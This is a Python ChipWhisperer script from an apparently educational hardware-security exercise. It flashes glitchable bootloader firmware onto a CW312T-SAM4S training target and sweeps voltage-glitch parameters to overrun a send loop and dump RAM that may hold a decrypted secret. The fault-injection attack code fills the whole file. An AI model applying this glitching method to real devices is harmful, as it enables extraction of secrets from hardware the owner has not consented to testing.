#!/usr/bin/env python3
# MIT License
#
# Copyright (c) 2026 David Reguera Garcia (aka Dreg)
# dreg@rootkit.es - https://github.com/therealdreg/abductor
#
# Disclaimer: this is the work of a hobbyist, shared in good faith for educational
# purposes. It is not professional work and may contain mistakes or inaccuracies;
# corrections and feedback are welcome. Provided "as is" and used at your own risk.
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

# fault101 Fault 2_3 on real hardware: voltage-glitch memory dump on the CW312T-SAM4S. The
# bootloader-glitch firmware sends its 8-byte ack with for(i=0; i<ascii_idx; i++) putch(...). A
# high-power crowbar glitch on that loop bound makes it keep sending past ascii_idx, into the
# adjacent buffer and RAM, which can include the decrypted data_buffer (the secret).
# A reply that contains "767" counts as success. The ack overwrites only the first 8 bytes of the
# stored command text, and the rest of that text holds "767" at offset 0x2a of the reply, so a hit
# shows an overrun. It does not by itself show the secret.
# Needs the prebuilt bootloader-glitch hex in HEX, which the script flashes, and the SMA tee at the
# UFO VOUT SMA. Short waits keep each attempt quick. No arguments. Prints each partial
# leak longer than the ones before it, the first dump and a summary; it saves no file.
import time
import chipwhisperer as cw

HEX="/home/dreg/chipwhisperer/firmware/mcu/bootloader-glitch/bootloader-CW312_SAM4S.hex"
CMD="p516261276720736265747267206762206f686c207a76797821\n"
TC=2159   # send-loop trig_count from fault_2_3_baseline.py, in target clock cycles

scope=cw.scope(); target=cw.target(scope, cw.targets.SimpleSerial2)
scope.default_setup()
# Reset the SAM4S before flashing. If an earlier test left it debug-halted or crashed,
# program_target can hang; after this reset, its own ERASE-pin and reset sequence reaches SAM-BA.
scope.io.nrst=False; time.sleep(0.1); scope.io.nrst="high_z"; time.sleep(0.3)
for k in range(2):
    try: cw.program_target(scope, cw.programmers.SAM4SProgrammer, HEX); print("flashed"); break
    except Exception as e: print("flash retry:", e); time.sleep(1.0)
scope.clock.adc_src="clkgen_x1"   # one ADC sample per target clock, as in fault_2_3_baseline.py
scope.vglitch_setup('hp', default_setup=False)
scope.glitch.trigger_src="ext_single"
def reboot_flush():
    scope.io.nrst=False; time.sleep(0.05); scope.io.nrst="high_z"; time.sleep(0.1); target.flush()
reboot_flush(); scope.adc.samples=2400; scope.adc.timeout=0.2

# One glitched attempt: wait 15 ms and read what has arrived; if at least the 8-byte ack came, wait
# 30 ms more and read the rest. Outcomes: "success" (the reply holds "767"), "reset" (no reply or a
# capture timeout, then the target is reset), "leak" (longer than the ack) and "normal".
def attempt(w,o,e):
    if scope.adc.state: reboot_flush()
    target.flush()
    scope.glitch.width=w; scope.glitch.offset=o; scope.glitch.ext_offset=e
    scope.arm(); target.write(CMD)
    ret=scope.capture(); scope.io.vglitch_reset()
    time.sleep(0.015); out=target.read(target.in_waiting(), timeout=40)
    if len(out)>=8:
        time.sleep(0.03); m=target.in_waiting()
        if m: out+=target.read(m, timeout=80)
    if "767" in out: return "success", out
    if len(out)==0 or ret: reboot_flush(); return "reset", out
    if len(out)>8: return "leak", out
    return "normal", out

cw.set_all_log_levels(cw.logging.ERROR); reboot_flush()
# (width, offset) candidates in Husky phase-shift steps, each swept over ext_offset 0 to TC in steps
# of 1. The sweep stops at the first dump, or after CAP attempts, which is more than the
# 7 x 2160 = 15120 of the full sweep. maxleak starts at the ack length.
CANDS=[(2000,2480),(2000,2470),(2000,2490),(1950,2480),(2050,2490),(1900,2100),(1900,2200)]
winner=None; maxleak=8; total=0; CAP=16000; t0=time.time()
for (w,o) in CANDS:
    for e in range(0, TC+1):
        cat,out=attempt(w,o,e); total+=1
        if cat=="success":
            winner=(w,o,e); print(f"MEMDUMP! width={w} offset={o} ext_offset={e} (attempt {total})")
            print("LEAKED", len(out), "bytes:", repr(out)); break
        if cat=="leak" and len(out)>maxleak:
            maxleak=len(out); print(f"partial leak {len(out)}B at (w={w},o={o},ext={e}): {repr(out[:140])}")
        if total>=CAP: break
    print(f"  cand w={w} o={o} done | total={total} rate={total/(time.time()-t0):.0f}/s maxleak={maxleak}")
    if winner or total>=CAP: break
cw.set_all_log_levels(cw.logging.WARNING)
scope.dis(); target.dis()
print("WINNER:", winner, "total:", total, "maxleak:", maxleak); print("DONE")
